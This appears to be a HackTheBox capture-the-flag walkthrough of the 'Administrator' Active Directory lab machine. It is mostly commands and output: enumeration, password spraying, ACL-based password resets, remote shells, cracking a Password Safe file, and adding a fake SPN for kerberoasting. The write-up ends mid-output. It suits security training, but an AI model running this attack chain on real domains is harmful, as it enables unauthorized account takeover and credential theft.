# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Administrator](https://www.hackthebox.com/machines/Administrator)

<img src="https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png" alt="Administrator Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium (<span style="color:#e63c35;">3.7</span>)

> As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: "Olivia" Password: "ichliebedich"

#### Tools Used

**Linux**:
- bloodhound
- bloodhound-python
- evil-winrm
- impacket-GetNPUsers
- impacket-psexec
- impacket-secretsdump
- john
- kerbrute
- ldapdomaindump
- net
- netexec
- nmap
- pwsafe
- pwsafe2john
- smbclient

**Windows**:
- PowerView.ps1
- Rubeus.exe

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22📌 netmask 255.255.254.0  destination 10.10.14.22
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::2082:c6a0:3cb9:9a5a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 48 (48.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.11.42`:
```
10.10.11.42 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.11.42`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:29 CET
Warning: 10.10.11.42 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.42
Host is up (0.053s latency).
Not shown: 65493 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd📌
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-13 18:37:54Z)📌
135/tcp   open     msrpc         Microsoft Windows RPC📌
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)📌
445/tcp   open     microsoft-ds?📌
464/tcp   open     kpasswd5?
515/tcp   filtered printer
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3137/tcp  filtered rtnt-1
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)📌
7730/tcp  filtered unknown
9389/tcp  open     mc-nmf        .NET Message Framing
12048/tcp filtered unknown
17962/tcp filtered unknown
23081/tcp filtered unknown
26134/tcp filtered unknown
32467/tcp filtered unknown
32881/tcp filtered unknown
38475/tcp filtered unknown
38887/tcp filtered unknown
41836/tcp filtered unknown
46505/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
48836/tcp filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
56859/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
56863/tcp open     msrpc         Microsoft Windows RPC
56873/tcp open     msrpc         Microsoft Windows RPC
56889/tcp open     msrpc         Microsoft Windows RPC
56925/tcp open     msrpc         Microsoft Windows RPC
59700/tcp open     msrpc         Microsoft Windows RPC
61959/tcp filtered unknown
65144/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 563.73 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.42`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:59 CET
Nmap scan report for 10.10.11.42
Host is up (0.054s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=administrator,DC=htb📌
|       ldapServiceName: administrator.htb:dc$@ADMINISTRATOR.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=administrator,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=administrator,DC=htb
|       namingContexts: DC=administrator,DC=htb
|       namingContexts: CN=Configuration,DC=administrator,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=administrator,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=administrator,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=administrator,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 141349
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb
|       dnsHostName: dc.administrator.htb📌
|       defaultNamingContext: DC=administrator,DC=htb
|       currentTime: 20241113185909.0Z
|_      configurationNamingContext: CN=Configuration,DC=administrator,DC=htb
Service Info: Host: DC; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

`echo -e '10.10.11.42\tdc.administrator.htb dc administrator.htb' | sudo tee -a /etc/hosts`:
```
10.10.11.42    dc.administrator.htb dc administrator.htb
```

`netexec smb 10.10.11.42`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)📌
```

`netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich'`:
```
MB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich📌
```

`netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON📌      READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL📌        READ            Logon server share
```

`netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --pass-pol`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [+] Dumping password info for domain: ADMINISTRATOR
SMB         10.10.11.42     445    DC               Minimum password length: 7
SMB         10.10.11.42     445    DC               Password history length: 24
SMB         10.10.11.42     445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.42     445    DC               
SMB         10.10.11.42     445    DC               Password Complexity Flags: 000000📌
SMB         10.10.11.42     445    DC                   Domain Refuse Password Change: 0
SMB         10.10.11.42     445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.11.42     445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.11.42     445    DC                   Domain Password No Clear Change: 0
SMB         10.10.11.42     445    DC                   Domain Password No Anon Change: 0
SMB         10.10.11.42     445    DC                   Domain Password Complex: 0
SMB         10.10.11.42     445    DC               
SMB         10.10.11.42     445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.10.11.42     445    DC               Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.42     445    DC               Locked Account Duration: 30 minutes 
SMB         10.10.11.42     445    DC               Account Lockout Threshold: None
SMB         10.10.11.42     445    DC               Forced Log off Time: Not Set
```

`netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --users`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0  
```

`netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --users | awk '{print $5}' | grep -v -E ']|-' | tee domain_users.txt`:
```
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

`kerbrute userenum --dc 10.10.11.42 -d 'administrator.htb' ./domain_users.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/20/24 - Ronnie Flathers @ropnop

2024/12/20 06:28:50 >  Using KDC(s):
2024/12/20 06:28:50 >   10.10.11.42:88

2024/12/20 06:28:50 >  [+] VALID USERNAME:       Administrator@administrator.htb
2024/12/20 06:28:50 >  [+] VALID USERNAME:       olivia@administrator.htb
2024/12/20 06:28:50 >  [+] VALID USERNAME:       emily@administrator.htb
2024/12/20 06:28:50 >  [+] VALID USERNAME:       michael@administrator.htb
2024/12/20 06:28:50 >  [+] VALID USERNAME:       ethan@administrator.htb
2024/12/20 06:28:50 >  [+] VALID USERNAME:       benjamin@administrator.htb
2024/12/20 06:28:50 >  Done! Tested 10 usernames (6 valid) in 0.218 seconds
```

`kerbrute userenum --dc 10.10.11.42 -d 'administrator.htb' ./domain_users.txt | grep 'VALID' | awk '{ print $7 }' | awk -F '@' '{ print $1 }' | awk '{ print tolower($0) }' | awk NF | sort | tee ./domain_users.txt`:
```
administrator
benjamin
emily
ethan
michael
olivia
```

`netexec smb 10.10.11.42 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.42     445    DC               [-] administrator.htb\benjamin:benjamin STATUS_LOGON_FAILURE 
SMB         10.10.11.42     445    DC               [-] administrator.htb\emily:emily STATUS_LOGON_FAILURE 
SMB         10.10.11.42     445    DC               [-] administrator.htb\ethan:ethan STATUS_LOGON_FAILURE 
SMB         10.10.11.42     445    DC               [-] administrator.htb\michael:michael STATUS_LOGON_FAILURE 
SMB         10.10.11.42     445    DC               [-] administrator.htb\olivia:olivia STATUS_LOGON_FAILURE 
```
❌

`impacket-GetNPUsers -dc-ip 10.10.11.42 'administrator.htb/' -usersfile ./domain_users.txt -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
```
❌

`netexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'`:
```
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)📌
```

`evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich'`:
```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```
🐚

![Victim: olivia](https://custom-icon-badges.demolab.com/badge/Victim-olivia-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
administrator\olivia
```

`dir C://Users/olivia/Desktop`:
```
```
❌

`dir C://Users/olivia/Desktop -Force`:
```
```
❌

`dir C://Users/`:
```
    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----        12/20/2024  10:46 AM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

`dir C://Users/emily/`:
```
Access to the path 'C:\Users\emily' is denied.
At line:1 char:1
+ dir C://Users/emily/
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\emily\:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```
❌

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ldapdomaindump 10.10.11.42 -u 'administrator.htb\olivia' -p 'ichliebedich' -o ./ldapdomaindump`:
```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

`tree ./ldapdomaindump/`:
```
ldapdomaindump
├── domain_computers.grep
├── domain_computers.html
├── domain_computers.json
├── domain_computers_by_os.html
├── domain_groups.grep
├── domain_groups.html
├── domain_groups.json
├── domain_policy.grep
├── domain_policy.html
├── domain_policy.json
├── domain_trusts.grep
├── domain_trusts.html
├── domain_trusts.json
├── domain_users.grep
├── domain_users.html
├── domain_users.json
└── domain_users_by_group.html

1 directory, 17 files
```

![ldapdomaindump - domain_users_by_group.html 1](./assets/screenshots/hackthebox_administrator_ldapdomaindump_1.png)

![ldapdomaindump - domain_users_by_group.html 2](./assets/screenshots/hackthebox_administrator_ldapdomaindump_2.png)

`sudo ntpdate 10.10.11.42`:
```
2024-12-20 14:12:19.642279 (-0500) +25200.334733 +/- 0.064680 10.10.11.42 s1 no-leap
CLOCK: time stepped by 25200.334733
```

`bloodhound-python -d 'administrator.htb' -ns 10.10.11.42 -u 'olivia' -p 'ichliebedich' -c All`:
```
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 39S
```

`ls -l ./*.json`:
```   
-rw-rw-r-- 1 nabla nabla  3994 Dec 20 07:13 ./20241220071225_computers.json
-rw-rw-r-- 1 nabla nabla 25178 Dec 20 07:12 ./20241220071225_containers.json
-rw-rw-r-- 1 nabla nabla  3580 Dec 20 07:12 ./20241220071225_domains.json
-rw-rw-r-- 1 nabla nabla  3998 Dec 20 07:12 ./20241220071225_gpos.json
-rw-rw-r-- 1 nabla nabla 82685 Dec 20 07:12 ./20241220071225_groups.json
-rw-rw-r-- 1 nabla nabla  1661 Dec 20 07:12 ./20241220071225_ous.json
-rw-rw-r-- 1 nabla nabla 26024 Dec 20 07:12 ./20241220071225_users.json
```

`zip ./bh.zip ./*.json`:
```
  adding: 20241220071225_computers.json (deflated 75%)
  adding: 20241220071225_containers.json (deflated 93%)
  adding: 20241220071225_domains.json (deflated 79%)
  adding: 20241220071225_gpos.json (deflated 85%)
  adding: 20241220071225_groups.json (deflated 94%)
  adding: 20241220071225_ous.json (deflated 64%)
  adding: 20241220071225_users.json (deflated 94%)
```

`sudo neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/bh.zip` > `Clear Finished`

`Search for a node: olivia` > `OLIVIA@ADMINISTRATOR.HTB` > `<right-click>` > `Mark User as Owned`

`OLIVIA@ADMINISTRATOR.HTB` > `Node Info`:
```
[...]

#### EXECUTION RIGHTS

|   |   |
|---|---|
|First Degree RDP Privileges|0|
|Group Delegated RDP Privileges|0|
|First Degree DCOM Privileges|0|
|Group Delegated DCOM Privileges|0|
|SQL Admin Rights|0|
|Constrained Delegation Privileges|0|

---

#### OUTBOUND OBJECT CONTROL

|   |   |
|---|---|
|First Degree Object Control|1|📌
|Group Delegated Object Control|0|
|Transitive Object Control|

[...]
```

`Graph`:
```
OLIVIA ---(GenericAll)--- MICHAEL
MICHAEL ---(ForceChangePassword)--- BENJAMIN
BENJAMIN ---(MemberOf)--- SHARE MODERATORS

EMILY ---(GenericWrite)--- ETHAN
ETHAN ---(DCSync)--- ADMINISTRATOR.HTB

OLIVIA ---(PSRemote)--- DC.ADMINISTRATOR.HTB
MICHAEL ---(PSRemote)--- DC.ADMINISTRATOR.HTB
EMILY ---(PSRemote)--- DC.ADMINISTRATOR.HTB
```

`net rpc password "michael" 'H4ck3d!' -U "administrator.htb"/"olivia"%"ichliebedich" -S "DC.administrator.htb"`

`netexec smb 10.10.11.42 -u 'michael' -p 'H4ck3d!'`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:H4ck3d!🔑
```

`netexec winrm 10.10.11.42 -u 'michael' -p 'H4ck3d!'`:
```
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:H4ck3d! (Pwn3d!)📌
```

`evil-winrm -i 10.10.11.42 -u 'michael' -p 'H4ck3d!'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>
```
🐚

![Victim: michael](https://custom-icon-badges.demolab.com/badge/Victim-michael-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
administrator\michael
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`net rpc password "benjamin" 'H4ck3d!' -U "administrator.htb"/"michael"%'H4ck3d!' -S "DC.administrator.htb"`

`netexec smb 10.10.11.42 -u 'benjamin' -p 'H4ck3d!'`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:H4ck3d!🔑
```

`ftp ftp://benjamin:'H4ck3d!'@10.10.11.42`:
```
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||54017|)
150 Opening ASCII mode data connection.
10-05-24  08:13AM                  952 Backup.psafe3📌
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||54019|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************|   952        6.85 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (6.83 KiB/s)
```

`file ./Backup.psafe3`:
```
./Backup.psafe3: Password Safe V3 database
```

`pwsafe2john ./Backup.psafe3 > ./psafe3_hash.txt`

`john ./psafe3_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)🔑     
1g 0:00:00:00 DONE (2024-12-28 11:05) 3.125g/s 19200p/s 19200c/s 19200C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`pwsafe ./Backup.psafe3`

![pwsafe - Backup.psafe3](./assets/screenshots/hackthebox_administrator_pwsafe.png)

`netexec smb 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb🔑
```

`netexec winrm 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`:
```
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)📌
```

`evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`:
```                                        
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents>
```
🐚

![Victim: emily](https://custom-icon-badges.demolab.com/badge/Victim-emily-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
administrator\emily
```

`dir C:\\Users\emily\Desktop`:
```
    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---        12/28/2024   1:54 PM             34 user.txt
```

`type C:\\Users\emily\Desktop\user.txt`:
```
714da*************************** 🚩
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`rpcclient -U emily%UXLCI5iETUsIBoFVTj8yQFKoHjXmb -c 'setuserinfo2 ETHAN 23 H4ck3d!' 10.10.11.42`:
```
result was NT_STATUS_ACCESS_DENIED
```
❌

`locate -i powerview.ps1`:
```
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

`cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./`

`upload ./PowerView.ps1`:
```
Info: Uploading /home/nabla/PowerView.ps1 to C:\Users\emily\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

![Victim: emily](https://custom-icon-badges.demolab.com/badge/Victim-emily-64b5f6?logo=windows11&logoColor=white)

`import-module ./PowerView.ps1`

`Set-ADUser -Identity "ETHAN" -Add @{servicePrincipalName="HTTP/fake_service"}`

`Get-DomainUser -Identity "ETHAN" | Select-Object servicePrincipalName`:
```
serviceprincipalname
--------------------
HTTP/fake_service📌
```

`Get-DomainUser -SPN`:
```
[...]

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : Ethan Hunt
userprincipalname     : ethan@administrator.htb
name                  : Ethan Hunt
objectsid             : S-1-5-21-1088858960-373806567-254189436-1113
samaccountname        : ethan📌
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 12/28/2024 11:57:30 PM
instancetype          : 4
usncreated            : 32855
objectguid            : 1a62f8b3-a5dd-4d55-8b37-464a32825662
sn                    : Hunt
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=administrator,DC=htb
dscorepropagationdata : {10/12/2024 8:30:02 PM, 10/6/2024 2:18:09 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname  : HTTP/fake_service📌
givenname             : Ethan
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Ethan Hunt
